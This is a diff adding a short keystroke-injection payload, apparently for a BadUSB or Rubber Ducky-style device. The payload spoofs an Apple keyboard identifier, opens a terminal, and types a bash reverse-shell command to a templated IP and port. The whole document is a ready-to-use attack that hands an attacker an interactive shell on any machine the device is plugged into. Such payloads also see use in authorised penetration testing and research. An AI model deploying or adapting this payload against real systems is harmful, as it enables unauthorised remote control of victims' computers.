@@ -1,0 +1,7 @@
+REM Creates a reverse shell using unix shell
+ID 05ac:021e Apple:Keyboard
+DELAY 200
+CTRL-ALT t
+DELAY 400
+STRING sh -i >& /dev/tcp/{ip}/{port} 0>&1{run_background}
+ENTER
